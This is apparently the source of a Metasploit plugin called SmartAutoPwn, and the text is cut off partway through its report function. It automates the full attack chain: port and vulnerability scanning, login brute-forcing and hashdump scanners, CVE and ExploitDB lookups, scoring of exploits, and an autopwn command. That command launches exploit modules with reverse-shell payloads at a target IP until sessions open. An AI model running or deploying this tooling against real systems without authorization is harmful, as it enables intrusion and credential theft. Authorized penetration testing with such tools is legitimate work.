##
# SmartAutoPwn - Intelligent Automated Exploitation Plugin for Metasploit Framework
#
# Author  :Aditya Singh
# Version : 3.0.0
# License : MIT (for authorized penetration testing only)
#
# FEATURES:
#   - Automated TCP + UDP port scanning (threaded, via nmap)
#   - Service version detection + DB storage
#   - Nmap NSE vulnerability script execution
#   - AI-based exploit scoring and ranking
#   - SearchSploit / ExploitDB integration
#   - CVE mapping for discovered services
#   - Auto-run applicable auxiliary scanners
#   - Auto-exploit with configurable rank threshold
#   - HTML + PDF + JSON report generation
#   - Full pipeline with one command: smart_scan <IP>
#
# INSTALL:
#   cp smart_autopwn.rb ~/.msf4/plugins/
#   msfconsole -x "load smart_autopwn"
##

require 'thread'
require 'json'
require 'open3'
require 'fileutils'
require 'socket'
require 'time'

module Msf
  class Plugin::SmartAutoPwn < Msf::Plugin

    # ═══════════════════════════════════════════════════════════════════════
    #   CONSOLE COMMAND DISPATCHER
    # ═══════════════════════════════════════════════════════════════════════
    class ConsoleCommandDispatcher
      include Msf::Ui::Console::CommandDispatcher

      # ── Constants ──────────────────────────────────────────────────────

      BANNER = %q{
╔══════════════════════════════════════════════════════════════════╗
║        SmartAutoPwn v3.0  –  Intelligent Auto-Exploitation       ║
║   Recon | Scan | NSE | CVE | SearchSploit | Exploit | Report     ║
╚══════════════════════════════════════════════════════════════════╝
}

      EXPLOIT_RANK_SCORES = {
        'ExcellentRanking' => 100,
        'GreatRanking'     => 90,
        'GoodRanking'      => 80,
        'NormalRanking'    => 70,
        'AverageRanking'   => 60,
        'LowRanking'       => 40,
        'ManualRanking'    => 20,
        'unknown'          => 10
      }.freeze

      # AI priority weights for exploit scoring
      AI_WEIGHTS = {
        rank_score:      0.40,   # 40% weight on Metasploit rank
        service_match:   0.25,   # 25% weight on service name match
        port_match:      0.15,   # 15% weight on port match
        version_match:   0.15,   # 15% weight on version match in description
        recency_bonus:   0.05    # 5% weight on module path depth (specificity)
      }.freeze

      # Well-known CVE mappings for common services
      CVE_MAP = {
        'ftp'       => [
          'CVE-2011-2523  – vsftpd 2.3.4 Backdoor Command Execution',
          'CVE-2010-4221  – ProFTPD SQL Injection / RCE',
          'CVE-2015-3306  – ProFTPD mod_copy Unauthenticated File Copy'
        ],
        'ssh'       => [
          'CVE-2018-15473 – OpenSSH User Enumeration (< 7.7)',
          'CVE-2016-6515  – OpenSSH Infinite Loop DoS',
          'CVE-2023-38408 – OpenSSH Agent Remote Code Execution'
        ],
        'smtp'      => [
          'CVE-2010-4344  – Exim Remote Code Execution',
          'CVE-2020-7247  – OpenSMTPD Remote Code Execution',
          'CVE-2019-16928 – Exim Heap-Based Buffer Overflow'
        ],
        'http'      => [
          'CVE-2021-41773 – Apache 2.4.49 Path Traversal / RCE',
          'CVE-2021-44228 – Log4Shell Remote Code Execution',
          'CVE-2017-7679  – Apache mod_mime Buffer Overflow',
          'CVE-2014-6271  – Shellshock (Bash CGI RCE)'
        ],
        'https'     => [
          'CVE-2014-0160  – Heartbleed (OpenSSL Memory Disclosure)',
          'CVE-2014-0224  – OpenSSL CCS Injection',
          'CVE-2021-44228 – Log4Shell Remote Code Execution',
          'CVE-2022-22965 – Spring4Shell RCE'
        ],
        'smb'       => [
          'CVE-2017-0144  – EternalBlue / MS17-010 (WannaCry)',
          'CVE-2020-0796  – SMBGhost (SMBv3 Compression RCE)',
          'CVE-2017-0145  – EternalRomance / MS17-010',
          'CVE-2008-4250  – MS08-067 (NetAPI) RCE'
        ],
        'rdp'       => [
          'CVE-2019-0708  – BlueKeep RCE (Pre-auth)',
          'CVE-2012-0002  – MS12-020 RDP DoS',
          'CVE-2019-1181  – DejaBlue RCE',
          'CVE-2019-1182  – DejaBlue RCE (variant)'
        ],
        'mysql'     => [
          'CVE-2012-2122  – MySQL Authentication Bypass',
          'CVE-2016-6662  – MySQL Remote Code Execution via Config',
          'CVE-2019-2725  – Oracle MySQL RCE'
        ],
        'mssql'     => [
          'CVE-2000-1209  – xp_cmdshell OS Command Execution',
          'CVE-2020-0618  – SQL Server Reporting Services RCE',
          'CVE-2021-1636  – Microsoft SQL Server Privilege Escalation'
        ],
        'vnc'       => [
          'CVE-2006-2369  – RealVNC Authentication Bypass',
          'CVE-2019-15694 – LibVNCServer Heap Buffer Overflow',
          'CVE-2020-29260 – LibVNCClient Buffer Overflow'
        ],
        'telnet'    => [
          'CVE-1999-0619  – Telnet Weak / No Authentication',
          'CVE-2001-0554  – BSD Telnet Remote Buffer Overflow'
        ],
        'snmp'      => [
          'CVE-2017-6736  – Cisco IOS SNMP Remote Code Execution',
          'CVE-2002-0013  – SNMP Default Community String Disclosure',
          'CVE-2017-9798  – Optionsbleed via SNMP'
        ],
        'ldap'      => [
          'CVE-2021-44228 – Log4Shell via LDAP JNDI Injection',
          'CVE-2017-8563  – Windows LDAP Elevation of Privilege',
          'CVE-2021-22005 – VMware vCenter LDAP RCE'
        ],
        'oracle'    => [
          'CVE-2012-1675  – Oracle TNS Listener Poison Attack',
          'CVE-2018-3004  – Oracle Database Server RCE',
          'CVE-2019-2725  – Oracle WebLogic RCE (Deserialization)'
        ],
        'postgresql' => [
          'CVE-2019-9193  – PostgreSQL COPY TO/FROM PROGRAM RCE',
          'CVE-2013-1899  – PostgreSQL Command-Line Flag Injection',
          'CVE-2016-5423  – PostgreSQL Privilege Escalation'
        ],
        'pop3'      => [
          'CVE-2003-0143  – Qualcomm WorldMail POP3 Buffer Overflow'
        ],
        'imap'      => [
          'CVE-2021-33879 – Cyrus IMAP Remote Code Execution'
        ],
        'redis'     => [
          'CVE-2022-0543  – Redis Lua Sandbox Escape / RCE',
          'CVE-2015-8080  – Redis Integer Overflow / DoS'
        ],
        'mongodb'   => [
          'CVE-2017-4928  – MongoDB Unauthorized Access (no auth by default)'
        ],
        'netbios'   => [
          'CVE-2008-4250  – MS08-067 NetAPI Stack Overflow'
        ]
      }.freeze

      # Auxiliary scanner mapping by service name
      AUX_SCANNER_MAP = {
        'ftp'        => %w[
          auxiliary/scanner/ftp/anonymous
          auxiliary/scanner/ftp/ftp_version
          auxiliary/scanner/ftp/ftp_login
        ],
        'ssh'        => %w[
          auxiliary/scanner/ssh/ssh_version
          auxiliary/scanner/ssh/ssh_enumusers
          auxiliary/scanner/ssh/ssh_login
        ],
        'http'       => %w[
          auxiliary/scanner/http/http_version
          auxiliary/scanner/http/dir_scanner
          auxiliary/scanner/http/files_dir
          auxiliary/scanner/http/robots_txt
          auxiliary/scanner/http/webdav_scanner
          auxiliary/scanner/http/http_put
          auxiliary/scanner/http/options
          auxiliary/scanner/http/title
        ],
        'https'      => %w[
          auxiliary/scanner/http/ssl
          auxiliary/scanner/http/http_version
          auxiliary/scanner/http/title
          auxiliary/scanner/http/cert
          auxiliary/scanner/http/heartbleed
        ],
        'smb'        => %w[
          auxiliary/scanner/smb/smb_version
          auxiliary/scanner/smb/smb_enumshares
          auxiliary/scanner/smb/smb_enumusers
          auxiliary/scanner/smb/smb_ms17_010
          auxiliary/scanner/smb/smb_login
        ],
        'smtp'       => %w[
          auxiliary/scanner/smtp/smtp_version
          auxiliary/scanner/smtp/smtp_enum
          auxiliary/scanner/smtp/smtp_relay
        ],
        'snmp'       => %w[
          auxiliary/scanner/snmp/snmp_enum
          auxiliary/scanner/snmp/snmp_enumusers
          auxiliary/scanner/snmp/snmp_login
        ],
        'mysql'      => %w[
          auxiliary/scanner/mysql/mysql_version
          auxiliary/scanner/mysql/mysql_login
          auxiliary/scanner/mysql/mysql_hashdump
          auxiliary/scanner/mysql/mysql_file_enum
        ],
        'mssql'      => %w[
          auxiliary/scanner/mssql/mssql_ping
          auxiliary/scanner/mssql/mssql_login
          auxiliary/scanner/mssql/mssql_enum
        ],
        'rdp'        => %w[
          auxiliary/scanner/rdp/rdp_scanner
          auxiliary/scanner/rdp/cve_2019_0708_bluekeep
          auxiliary/scanner/rdp/ms12_020_check
        ],
        'vnc'        => %w[
          auxiliary/scanner/vnc/vnc_none_auth
          auxiliary/scanner/vnc/vnc_login
        ],
        'telnet'     => %w[
          auxiliary/scanner/telnet/telnet_version
          auxiliary/scanner/telnet/telnet_login
        ],
        'ldap'       => %w[
          auxiliary/scanner/ldap/ldap_hashdump
          auxiliary/scanner/ldap/ldap_login
        ],
        'pop3'       => %w[
          auxiliary/scanner/pop3/pop3_version
          auxiliary/scanner/pop3/pop3_login
        ],
        'imap'       => %w[
          auxiliary/scanner/imap/imap_version
        ],
        'postgresql' => %w[
          auxiliary/scanner/postgres/postgres_version
          auxiliary/scanner/postgres/postgres_login
          auxiliary/scanner/postgres/postgres_hashdump
        ],
        'redis'      => %w[
          auxiliary/scanner/redis/redis_server
          auxiliary/scanner/redis/file_upload
        ],
        'mongodb'    => %w[
          auxiliary/scanner/mongodb/mongodb_login
        ],
        'oracle'     => %w[
          auxiliary/scanner/oracle/oracle_login
          auxiliary/scanner/oracle/sid_brute
          auxiliary/scanner/oracle/tnslsnr_version
        ]
      }.freeze

      # PORT → service name fallback
      PORT_SERVICE_MAP = {
        21   => 'ftp',       22   => 'ssh',     23  => 'telnet',
        25   => 'smtp',      53   => 'dns',      80  => 'http',
        110  => 'pop3',      111  => 'rpcbind',  119 => 'nntp',
        135  => 'msrpc',     139  => 'netbios',  143 => 'imap',
        161  => 'snmp',      389  => 'ldap',     443 => 'https',
        445  => 'smb',       465  => 'smtps',    513 => 'rlogin',
        514  => 'rsh',       515  => 'printer',  587 => 'smtp',
        631  => 'ipp',       636  => 'ldaps',    873 => 'rsync',
        993  => 'imaps',     995  => 'pop3s',    1080 => 'socks',
        1433 => 'mssql',     1521 => 'oracle',   1723 => 'pptp',
        2049 => 'nfs',       2121 => 'ftp',      3306 => 'mysql',
        3389 => 'rdp',       4444 => 'msf',      5432 => 'postgresql',
        5900 => 'vnc',       5984 => 'couchdb',  6379 => 'redis',
        6443 => 'kubernetes',8080 => 'http',      8443 => 'https',
        8888 => 'http',      9200 => 'elasticsearch', 27017 => 'mongodb'
      }.freeze

      # ── Command Registration ────────────────────────────────────────

      def name
        'SmartAutoPwn'
      end

      def commands
        {
          'smart_scan'         => 'Full auto pipeline: scan→NSE→aux→CVE→exploits→report [IP]',
          'smart_portscan'     => 'TCP + UDP threaded port scan, save to DB          [IP] [--udp] [--threads N] [--top-ports N]',
          'smart_services'     => 'Show all discovered services from DB              [IP]',
          'smart_nse'          => 'Run Nmap NSE vulnerability scripts                [IP]',
          'smart_aux'          => 'Auto-run all applicable auxiliary scanners         [IP]',
          'smart_cve'          => 'Map discovered services to known CVEs             [IP]',
          'smart_searchsploit' => 'Search ExploitDB via SearchSploit                 [IP]',
          'smart_exploits'     => 'AI-ranked exploit search for all services         [IP] [--rank excellent|great|good|normal]',
          'smart_autopwn'      => 'Auto-attempt exploitation on target               [IP] [--rank excellent] [--lhost IP] [--stop-on-session]',
          'smart_report'       => 'Generate HTML / PDF / JSON report                 [IP] [--format html|pdf|json|all]',
          'smart_status'       => 'Show DB statistics and session count',
          'smart_help'         => 'Show this help message',
        }
      end

      # ================================================================
      #  CMD: smart_help
      # ================================================================
      def cmd_smart_help(*args)
        print_line(BANNER)
        begin
          print_line('  AVAILABLE COMMANDS'.colorize(:bold))
        rescue
          print_line('  AVAILABLE COMMANDS')
        end
        print_line('  ' + '─' * 72)
        commands.each do |cmd, desc|
          print_line("  \e[36m#{cmd.ljust(22)}\e[0m #{desc}")
        end
        print_line
        print_line('  QUICK START EXAMPLES:')
        print_line('  ─' + '─' * 72)
        print_line('  smart_scan 192.168.1.10                              # Full pipeline')
        print_line('  smart_portscan 192.168.1.10 --udp --threads 100      # Custom scan')
        print_line('  smart_exploits 192.168.1.10 --rank good              # Filtered exploits')
        print_line('  smart_autopwn 192.168.1.10 --rank excellent          # Auto-exploit')
        print_line('  smart_report 192.168.1.10 --format all               # Full report')
        print_line('  smart_nse 192.168.1.10                               # NSE vuln scripts')
        print_line('  smart_cve 192.168.1.10                               # CVE mappings')
        print_line('  smart_searchsploit 192.168.1.10                      # SearchSploit')
        print_line
      end

      # ================================================================
      #  CMD: smart_status
      # ================================================================
      def cmd_smart_status(*args)
        print_line
        print_good('SmartAutoPwn v3.0 – System Status')
        print_line('─' * 50)

        if db_active?
          hosts    = framework.db.hosts.count    rescue 0
          services = framework.db.services.count rescue 0
          vulns    = framework.db.vulns.count    rescue 0
          ws       = framework.db.workspace.name rescue 'default'
          print_good("Database     : CONNECTED")
          print_status("Workspace    : #{ws}")
          print_status("Total Hosts  : #{hosts}")
          print_status("Total Svc    : #{services}")
          print_status("Total Vulns  : #{vulns}")
        else
          print_error("Database     : NOT CONNECTED")
          print_status("Run: db_connect postgres://msf:pass@localhost/msf")
          print_status("  or: msfdb init && db_connect -y")
        end

        sessions = framework.sessions.count rescue 0
        print_status("Open Sessions: #{sessions}")
        print_status("Nmap         : #{nmap_available? ? 'FOUND' : 'NOT FOUND (install nmap)'}")
        print_status("SearchSploit : #{searchsploit_available? ? 'FOUND' : 'NOT FOUND (apt install exploitdb)'}")
        print_status("wkhtmltopdf  : #{wkhtmltopdf_available? ? 'FOUND' : 'NOT FOUND (for PDF reports)'}")
        print_line
      end

      # ================================================================
      #  CMD: smart_scan  (FULL PIPELINE)
      # ================================================================
      def cmd_smart_scan(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        print_line(BANNER)
        print_good("▶ Launching full SmartAutoPwn pipeline on: \e[33m#{target}\e[0m")
        print_status("  Started   : #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}")
        print_status("  Workspace : #{db_active? ? framework.db.workspace.name : 'NO DB – results will NOT be stored!'}")
        print_line

        stages = [
          ['1/7', 'TCP + UDP Port Scan',          -> { cmd_smart_portscan(target, '--udp', '--top-ports', '1000') }],
          ['2/7', 'NSE Vulnerability Scripts',     -> { cmd_smart_nse(target) }],
          ['3/7', 'Auxiliary Scanners',            -> { cmd_smart_aux(target) }],
          ['4/7', 'SearchSploit / ExploitDB',      -> { cmd_smart_searchsploit(target) }],
          ['5/7', 'CVE Mapping',                   -> { cmd_smart_cve(target) }],
          ['6/7', 'AI-Ranked Exploit Search',      -> { cmd_smart_exploits(target, '--auto-rank') }],
          ['7/7', 'Report Generation (all formats)',-> { cmd_smart_report(target, '--format', 'all') }]
        ]

        stages.each do |stage_num, stage_name, stage_proc|
          print_line
          print_status("\e[35m[Stage #{stage_num}]\e[0m #{stage_name}")
          print_line('  ' + '─' * 60)
          begin
            stage_proc.call
          rescue => e
            print_error("Stage #{stage_num} error: #{e.message}")
          end
        end

        print_line
        print_good("✔ SmartAutoPwn pipeline COMPLETE for #{target}")
        print_status("  Finished  : #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}")
        print_status("  Reports   : /tmp/smartautopwn_reports/")
        print_status("  Tip       : Run 'smart_autopwn #{target}' to attempt exploitation")
        print_line
      end

      # ================================================================
      #  CMD: smart_portscan
      # ================================================================
      def cmd_smart_portscan(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        unless nmap_available?
          print_error("Nmap not found! Install: sudo apt install nmap")
          return
        end

        threads   = opts['threads']   || 200
        top_ports = opts['top-ports'] || 1000
        do_udp    = opts.key?('udp')
        outdir    = '/tmp/smartautopwn_scans'
        FileUtils.mkdir_p(outdir)
        safe_ip   = target.gsub('.', '_')

        print_status("Port scan started on \e[33m#{target}\e[0m")
        print_status("  TCP top-#{top_ports} ports | Threads: #{threads}#{do_udp ? ' | UDP top-200' : ''}")
        print_line

        # ── TCP scan ──────────────────────────────────────────────────
        tcp_xml = "#{outdir}/tcp_#{safe_ip}_#{timestamp_tag}.xml"
        tcp_cmd = [
          'nmap', '-sV', '-sC', '-T4',
          '--open',
          "--top-ports #{top_ports}",
          "--min-parallelism #{threads}",
          "-oX #{tcp_xml}",
          "-oN -",   # also print to stdout
          target
        ].join(' ')

        print_status("Running TCP scan...")
        print_line("  CMD: #{tcp_cmd}")
        tcp_out, tcp_ok = run_cmd(tcp_cmd)

        if tcp_ok
          print_good("TCP scan complete. Importing to database...")
          import_nmap_xml(tcp_xml)
          display_open_ports(tcp_out)
        else
          print_error("TCP scan failed: #{tcp_out.lines.first(3).join}")
        end

        # ── UDP scan ──────────────────────────────────────────────────
        if do_udp
          udp_xml = "#{outdir}/udp_#{safe_ip}_#{timestamp_tag}.xml"
          udp_cmd = "nmap -sU --top-ports 200 -T4 --open -oX #{udp_xml} -oN - #{target}"
          print_status("Running UDP scan (requires root/sudo)...")
          print_line("  CMD: #{udp_cmd}")
          udp_out, udp_ok = run_cmd(udp_cmd)

          if udp_ok
            print_good("UDP scan complete. Importing to database...")
            import_nmap_xml(udp_xml)
            display_open_ports(udp_out)
          else
            print_warning("UDP scan error (expected without root): #{udp_out.lines.first(2).join.strip}")
          end
        end

        print_line
        cmd_smart_services(target)
      end

      # ================================================================
      #  CMD: smart_services
      # ================================================================
      def cmd_smart_services(*args)
        target, _ = parse_args(args)
        return unless validate_target(target)

        services = get_services(target)

        if services.empty?
          print_warning("No services found in DB for #{target}.")
          print_status("  Run: smart_portscan #{target}")
          return
        end

        print_good("Discovered services on \e[33m#{target}\e[0m [#{services.size} total]")
        print_line
        print_line("  \e[36mPORT     PROTO  SERVICE     VERSION / INFO\e[0m")
        print_line('  ' + '─' * 70)

        services.sort_by { |s| s.port.to_i }.each do |svc|
          port  = "#{svc.port}/#{svc.proto}".ljust(10)
          name  = (svc.name || 'unknown').ljust(12)
          info  = svc.info || ''
          state_color = "\e[32mopen\e[0m"
          print_line("  #{port} #{state_color}  #{name} #{info}")
        end
        print_line
      end

      # ================================================================
      #  CMD: smart_nse
      # ================================================================
      def cmd_smart_nse(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        unless nmap_available?
          print_error("Nmap not found!")
          return
        end

        outdir  = '/tmp/smartautopwn_scans'
        FileUtils.mkdir_p(outdir)
        nse_xml = "#{outdir}/nse_#{target.gsub('.','_')}_#{timestamp_tag}.xml"

        nse_scripts = %w[
          vuln
          auth
          exploit
          safe
          smb-vuln-ms17-010
          smb-vuln-ms08-067
          smb-vuln-cve-2017-7494
          smb-vuln-regsvc-dos
          http-vuln-cve2014-3704
          http-vuln-cve2017-5638
          http-vuln-cve2021-41773
          http-shellshock
          ftp-vsftpd-backdoor
          ftp-proftpd-backdoor
          ssl-heartbleed
          ssl-poodle
          rdp-vuln-ms12-020
          ms-sql-empty-password
          mysql-empty-password
          vnc-info
          smtp-vuln-cve2010-4344
        ].join(',')

        nse_cmd = [
          'nmap', '-sV',
          "--script=\"#{nse_scripts}\"",
          '-T4', '--open',
          "-oX #{nse_xml}",
          '-oN -',
          target
        ].join(' ')

        print_status("Running NSE vulnerability scripts on \e[33m#{target}\e[0m...")
        print_line("  Scripts  : #{nse_scripts.split(',').size} script categories/names")
        print_line("  CMD      : #{nse_cmd}")
        print_line

        out, ok = run_cmd(nse_cmd)

        if ok
          print_good("NSE scan complete. Importing results...")
          import_nmap_xml(nse_xml)
          display_nse_vulns(out)
        else
          print_error("NSE scan failed: #{out.lines.first(3).join.strip}")
        end
      end

      # ================================================================
      #  CMD: smart_aux
      # ================================================================
      def cmd_smart_aux(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        services = get_services(target)
        if services.empty?
          print_warning("No services found. Run: smart_portscan #{target}")
          return
        end

        print_status("Launching auxiliary scanners on \e[33m#{target}\e[0m...")
        print_line

        launched = 0
        services.each do |svc|
          svc_name  = resolve_service_name(svc)
          mod_names = AUX_SCANNER_MAP[svc_name] || []
          next if mod_names.empty?

          print_status("  \e[36m#{svc_name.upcase}:#{svc.port}\e[0m – #{mod_names.size} scanner(s)")

          mod_names.each do |mod_name|
            begin
              mod = framework.modules.create(mod_name)
              unless mod
                print_warning("    Module not found: #{mod_name}")
                next
              end
              mod.datastore['RHOSTS'] = target
              mod.datastore['RPORT']  = svc.port.to_s
              print_status("    ► #{mod_name}")
              mod.run_simple(
                'LocalInput'  => driver.input,
                'LocalOutput' => driver.output,
                'RunAsJob'    => true
              )
              launched += 1
            rescue => e
              print_warning("    #{mod_name}: #{e.message}")
            end
          end
        end

        print_line
        print_good("Auxiliary scanners launched: #{launched} job(s) queued")
        print_status("  Check jobs with: jobs -l")
      end

      # ================================================================
      #  CMD: smart_cve
      # ================================================================
      def cmd_smart_cve(*args)
        target, _ = parse_args(args)
        return unless validate_target(target)

        services = get_services(target)
        if services.empty?
          print_warning("No services found. Run: smart_portscan #{target}")
          return
        end

        print_good("CVE Mapping for \e[33m#{target}\e[0m")
        print_line

        total_cves = 0
        services.each do |svc|
          svc_name = resolve_service_name(svc)
          info_str = svc.info.to_s.downcase

          cves = (CVE_MAP[svc_name] || []).dup

          # Also check info string against CVE_MAP keys
          CVE_MAP.each do |k, v|
            cves |= v if info_str.include?(k) && k != svc_name
          end

          # Extra checks from version string
          cves << 'CVE-2014-6271 – Shellshock (Bash CGI)'   if info_str.include?('cgi')
          cves << 'CVE-2014-0160 – Heartbleed'              if info_str.match?(/openssl\s+(0\.|1\.0\.[0-1])/)
          cves << 'CVE-2017-0144 – EternalBlue (MS17-010)'  if svc.port.to_i == 445
          cves << 'CVE-2019-0708 – BlueKeep'                if svc.port.to_i == 3389

          cves.uniq!
          next if cves.empty?

          total_cves += cves.size
          print_line("  \e[33m#{svc.port}/#{svc.proto}\e[0m [\e[36m#{svc_name.upcase}\e[0m] #{svc.info}")
          cves.each { |c| print_line("    \e[31m►\e[0m #{c}") }
          print_line
        end

        if total_cves == 0
          print_warning("No CVE mappings found for discovered services on #{target}")
        else
          print_good("Total CVEs mapped: #{total_cves}")
        end
      end

      # ================================================================
      #  CMD: smart_searchsploit
      # ================================================================
      def cmd_smart_searchsploit(*args)
        target, _ = parse_args(args)
        return unless validate_target(target)

        unless searchsploit_available?
          print_error("SearchSploit not found!")
          print_status("  Install: sudo apt install exploitdb  OR  sudo apt install exploitdb-bin-sploits")
          return
        end

        services = get_services(target)
        if services.empty?
          print_warning("No services found. Run: smart_portscan #{target}")
          return
        end

        print_status("Searching ExploitDB via SearchSploit for \e[33m#{target}\e[0m...")
        print_line

        total_results = 0
        searched_terms = []

        services.each do |svc|
          search_terms = build_searchsploit_terms(svc)
          search_terms.each do |term|
            next if term.length < 4 || searched_terms.include?(term.downcase)
            searched_terms << term.downcase

            out, ok = run_cmd("searchsploit --json \"#{term}\" 2>/dev/null")
            next unless ok

            begin
              data    = JSON.parse(out)
              results = (data['RESULTS_EXPLOIT'] || []) + (data['RESULTS_SHELLCODE'] || [])
              next if results.empty?

              print_good("SearchSploit: '#{term}' → #{results.size} result(s) [port #{svc.port}]")
              results.first(6).each do |r|
                type  = r['Type'].to_s.ljust(12)
                title = r['Title'].to_s
                path  = r['Path'].to_s
                print_line("  \e[33m[#{type}]\e[0m #{title}")
                print_line("             Path: #{path}")
              end
              print_line
              total_results += results.size
            rescue JSON::ParserError
              # Skip non-JSON responses
            end
          end
        end

        if total_results == 0
          print_warning("No SearchSploit results found for services on #{target}")
        else
          print_good("SearchSploit total: #{total_results} exploit(s) found")
        end
      end

      # ================================================================
      #  CMD: smart_exploits  (AI-ranked)
      # ================================================================
      def cmd_smart_exploits(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        min_rank_name = (opts['rank'] || 'normal').downcase
        min_score     = rank_name_to_score(min_rank_name)

        services = get_services(target)
        if services.empty?
          print_warning("No services found. Run: smart_portscan #{target}")
          return
        end

        print_status("AI-ranked exploit search for \e[33m#{target}\e[0m [min-rank: #{min_rank_name}]...")
        print_line

        all_exploits = []

        services.each do |svc|
          svc_name = resolve_service_name(svc)
          terms    = build_metasploit_search_terms(svc)

          terms.each do |term|
            next if term.to_s.strip.empty?
            begin
              results = framework.modules.search(search_string: term, type: 'exploit') rescue []
              results.each do |mod_info|
                next unless mod_info['fullname']
                score = ai_score_exploit(mod_info, svc, term)
                all_exploits << {
                  module:    mod_info,
                  service:   svc,
                  svc_name:  svc_name,
                  term:      term,
                  ai_score:  score
                }
              end
            rescue => e
              # Silently skip search errors
            end
          end
        end

        # Deduplicate by fullname, keep highest score
        deduped = {}
        all_exploits.each do |e|
          fn = e[:module]['fullname']
          deduped[fn] = e if !deduped[fn] || e[:ai_score] > deduped[fn][:ai_score]
        end
        all_exploits = deduped.values

        # Filter by minimum rank score
        all_exploits.select! do |e|
          rk = e[:module]['rank'] || 'unknown'
          (EXPLOIT_RANK_SCORES[rk] || 10) >= min_score
        end

        # AI sort: descending by ai_score, then by rank
        all_exploits.sort_by! { |e| [-e[:ai_score], -(EXPLOIT_RANK_SCORES[e[:module]['rank']] || 0)] }

        if all_exploits.empty?
          print_warning("No exploits found for #{target} above rank: #{min_rank_name}")
          return
        end

        print_good("Found \e[32m#{all_exploits.size}\e[0m exploit(s) for #{target}:")
        print_line
        print_line("  \e[36m#{'RANK'.ljust(16)} AISCORE  PORT   SERVICE     MODULE'\e[0m")
        print_line('  ' + '─' * 78)

        all_exploits.first(25).each_with_index do |e, idx|
          rank    = (e[:module]['rank'] || 'unknown').sub('Ranking', '').ljust(12)
          score   = e[:ai_score].to_s.rjust(3)
          port    = e[:service].port.to_s.ljust(6)
          svc_str = e[:svc_name].ljust(12)
          mod_str = e[:module]['fullname']

          rank_color = case e[:module]['rank']
            when 'ExcellentRanking' then "\e[32m"
            when 'GreatRanking'     then "\e[32m"
            when 'GoodRanking'      then "\e[33m"
            else "\e[37m"
          end

          print_line("  #{rank_color}#{rank}\e[0m  #{score}  #{port} #{svc_str} #{mod_str}")
        end

        print_line
        print_status("Showing top 25 of #{all_exploits.size} total. Use --rank excellent for top-tier only.")
        print_status("Run: smart_autopwn #{target} --rank excellent   to auto-attempt these")

        # Cache for autopwn
        @ranked_exploits       ||= {}
        @ranked_exploits[target] = all_exploits
      end

      # ================================================================
      #  CMD: smart_autopwn
      # ================================================================
      def cmd_smart_autopwn(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        min_rank_name    = (opts['rank'] || 'excellent').downcase
        min_score        = rank_name_to_score(min_rank_name)
        lhost            = opts['lhost'] || get_local_ip
        lport_base       = (opts['lport'] || 4444).to_i
        stop_on_session  = opts.key?('stop-on-session')

        print_status("SmartAutoPwn: launching auto-exploitation on \e[33m#{target}\e[0m")
        print_status("  Min Rank : #{min_rank_name} (score ≥ #{min_score})")
        print_status("  LHOST    : #{lhost}")
        print_status("  LPORT    : #{lport_base}+")
        print_line

        # Ensure we have exploit data
        unless @ranked_exploits && @ranked_exploits[target]
          print_status("No cached exploit list. Running smart_exploits first...")
          cmd_smart_exploits(target)
        end

        exploits = (@ranked_exploits[target] || []).select do |e|
          (EXPLOIT_RANK_SCORES[e[:module]['rank']] || 0) >= min_score
        end

        if exploits.empty?
          print_warning("No exploits with rank ≥ #{min_rank_name} found for #{target}")
          return
        end

        print_good("Attempting #{exploits.size} exploit(s) on #{target}...")
        print_line

        session_count = 0
        lport         = lport_base

        exploits.each_with_index do |e, idx|
          fullname = e[:module]['fullname']
          svc_port = e[:service].port
          rank     = (e[:module]['rank'] || 'unknown').sub('Ranking', '')

          print_status("  [\e[35m#{idx + 1}/#{exploits.size}\e[0m] #{fullname}")
          print_status("         Port: #{svc_port} | Rank: #{rank} | AI-Score: #{e[:ai_score]}")

          begin
            mod = framework.modules.create(fullname)
            unless mod
              print_warning("         Module not available – skipping")
              next
            end

            # Set standard options
            mod.datastore['RHOSTS']  = target
            mod.datastore['RPORT']   = svc_port.to_s
            mod.datastore['LHOST']   = lhost
            mod.datastore['LPORT']   = lport.to_s
            mod.datastore['VERBOSE'] = 'false'

            # Auto-select best payload
            payload_name = select_best_payload(mod)
            if payload_name
              mod.datastore['PAYLOAD'] = payload_name
              print_status("         Payload : #{payload_name}")
            end

            # Validate required options
            unless options_valid?(mod)
              print_warning("         Missing required options – skipping")
              next
            end

            # Run with timeout in a thread
            done = false
            t = Thread.new do
              begin
                mod.run_simple(
                  'LocalInput'  => driver.input,
                  'LocalOutput' => driver.output,
                  'RunAsJob'    => false
                )
              rescue => ex
                print_warning("         Module error: #{ex.message}")
              ensure
                done = true
              end
            end

            timeout = 30
            deadline = Time.now + timeout
            sleep(0.2) until done || Time.now > deadline
            t.kill if t.alive?

            # Check for new sessions
            new_sess = framework.sessions.select { |_k, s| s.target_host == target rescue false }
            if new_sess.any?
              session_count += 1
              print_good("         \e[32m✔ SESSION OPENED\e[0m – session #{new_sess.keys.first} on #{target}")
              break if stop_on_session
            end

          rescue => err
            print_warning("         Error: #{err.message}")
          end

          lport += 1
          sleep(0.5)
        end

        print_line
        if session_count > 0
          print_good("AutoPwn complete: \e[32m#{session_count} session(s)\e[0m opened on #{target}")
          print_status("  Type 'sessions -l' to list all sessions")
        else
          print_warning("AutoPwn complete: No sessions obtained on #{target}")
          print_status("  Tip: Try lowering rank with --rank good or --rank normal")
        end
      end

      # ================================================================
      #  CMD: smart_report
      # ================================================================
      def cmd_smart_report(*args)
        target, opts = parse_args(args)
        return unless validate_target(target)

        format  = (opts['format'] || 'html').downcase
        outdir  = opts['outdir'] || '/tmp/smartautopwn_reports'
        FileUtils.mkdir_p(outdir)

        services = get_services(target)
        exploits = (@ranked_exploits && @ranked_exploits[target]) || []
        ts       = timestamp_tag
        safe_ip  = target.gsub('.', '_')
        base     = "#{outdir}/smartautopwn_#{safe_ip}_#{ts}"

        html_path = nil

        # ── HTML ─────────────────────────────────────────────────────
        if %w[html all both].include?(format)
          html_path = "#{base}.html"
          html      = render_html_report(target, services, exploits)
          File.write(html_path, html)
          print_good("HTML report : \e[36m#{html_path}\e[0m")
        end

        # ── PDF ──────────────────────────────────────────────────────
        if %w[pdf all both].include?(format)
          if html_path && wkhtmltopdf_available?
            pdf_path = "#{base}.pdf"
